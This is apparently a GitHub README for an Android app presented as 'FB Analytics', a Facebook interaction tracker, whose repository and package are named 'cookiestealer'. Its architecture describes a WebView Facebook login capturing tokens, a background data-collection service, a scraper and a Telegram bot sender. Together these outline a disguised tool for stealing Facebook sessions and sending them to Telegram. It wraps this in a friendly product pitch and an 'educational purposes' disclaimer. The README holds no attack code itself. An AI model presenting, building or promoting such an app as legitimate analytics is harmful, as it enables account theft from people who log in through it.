# FB Analytics

<div align="center">

![Android](https://img.shields.io/badge/Platform-Android-green.svg)
![Kotlin](https://img.shields.io/badge/Language-Kotlin-blue.svg)
![Min SDK](https://img.shields.io/badge/Min%20SDK-24-orange.svg)
![Target SDK](https://img.shields.io/badge/Target%20SDK-34-orange.svg)

Android application for analyzing and tracking Facebook interactions

</div>

## 📋 Description

**FB Analytics** is an Android application built with Kotlin that allows users to analyze and track interactions on Facebook. The app provides detailed insights about user activity and friend interactions on the social media platform.

## ✨ Key Features

- 🔐 **Facebook Login**: Secure login via WebView with token authentication
- 📊 **Data Analysis**: Display detailed interaction statistics
- 👥 **Friend Management**: Track and analyze friend interactions
- 🔄 **Background Data Collection**: Background service for collecting information
- 📱 **Modern Interface**: Material Design with smooth animations
- 🎨 **Glass Morphism UI**: Beautiful interface with glass blur effects
- 🔔 **Notifications**: Foreground service notification support
- 📡 **Telegram Integration**: Send reports via Telegram Bot

## 🏗️ Architecture

### Main Activities:

- **MainActivity**: Main screen and landing page
- **LoginActivity**: Handles Facebook login via WebView
- **AnalysisActivity**: Displays data analysis and statistics

### Components:

- **DataCollectorService**: Foreground Service for background data collection
- **FacebookApiHelper**: Handles API requests to Facebook
- **FacebookScraper**: Collects and parses data from Facebook
- **InteractionDatabase**: Manages local database
- **TelegramSender**: Sends notifications via Telegram Bot

## 🛠️ Technologies Used

- **Language**: Kotlin
- **Min SDK**: Android 7.0 (API 24)
- **Target SDK**: Android 14 (API 34)
- **UI Framework**: 
  - Jetpack Compose
  - Material Design 3
  - Traditional XML Layouts
- **Networking**: OkHttp3
- **Async**: Kotlin Coroutines
- **WebView**: Android WebView with JavaScript enabled

## 📦 Dependencies

```gradle
// Core Android
androidx.core:core-ktx:1.12.0
androidx.appcompat:appcompat:1.6.1
com.google.android.material:material:1.11.0

// Networking
com.squareup.okhttp3:okhttp:4.12.0

// Coroutines
org.jetbrains.kotlinx:kotlinx-coroutines-android:1.7.3

// Jetpack Compose
androidx.compose:compose-bom:2023.08.00
androidx.compose.material3:material3
androidx.activity:activity-compose:1.8.2
androidx.lifecycle:lifecycle-runtime-compose:2.7.0
```

## 📱 System Requirements

- Android 7.0 (API 24) or higher
- Internet connection
- Facebook account

## 🔐 Permissions

The app requires the following permissions:

```xml
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
<uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
<uses-permission android:name="android.permission.WAKE_LOCK" />
```

## 🚀 Installation

### Clone the repository:

```bash
git clone https://github.com/duydat1412/cookiestealer.git
```

### Open the project in Android Studio:

1. Open Android Studio
2. Select "Open an Existing Project"
3. Select the `cookiestealer` folder
4. Wait for Gradle sync to complete

### Build and run:

1. Connect an Android device or open an emulator
2. Press "Run" (Shift + F10) or click the ▶️ icon

## 📝 Configuration

### Build Variants:

- **Debug**: Build for development and testing
- **Release**: Optimized build for production

### ProGuard:

Configuration file located at `app/proguard-rules.pro` (currently minify disabled)

## 🎨 User Interface

The app uses a custom theme with:

- Glass morphism effects
- Gradient backgrounds
- Smooth animations (fade in, slide up, scale)
- Material Design 3 components
- Custom drawables and icons

## 📊 Database Structure

The app uses SQLite local database to store:

- Interaction information
- User data
- API response cache

## 🔧 Development

### Package structure:

```
com.example.cookiestealer/
├── MainActivity.kt
├── LoginActivity.kt
├── AnalysisActivity.kt
├── DataCollectorService.kt
├── FacebookApiHelper.kt
├── FacebookScraper.kt
├── InteractionDatabase.kt
├── TelegramSender.kt
└── ui/theme/
    ├── Color.kt
    ├── Theme.kt
    └── Type.kt
```

## ⚠️ Important Notes

- This application is developed for educational and research purposes
- Comply with Facebook's policies and terms of service
- Secure user login information
- Do not share or store personal information without permission

## 📄 License

This project is released under the MIT License.

## 👨‍💻 Author

**Duy Dat**

- Facebook: [duydat141207](https://fb.com/duydat141207)
- GitHub: [@duydat1412](https://github.com/duydat1412)

## 🤝 Contributing

All contributions are welcome! Please create a pull request or open an issue to report bugs and suggest new features.

## 📞 Contact

If you have any questions or suggestions, please contact via:

- Email: [Create an issue on GitHub]
- Facebook: https://fb.com/duydat141207

---

<div align="center">
Made with ❤️ by Duy Dat
</div>
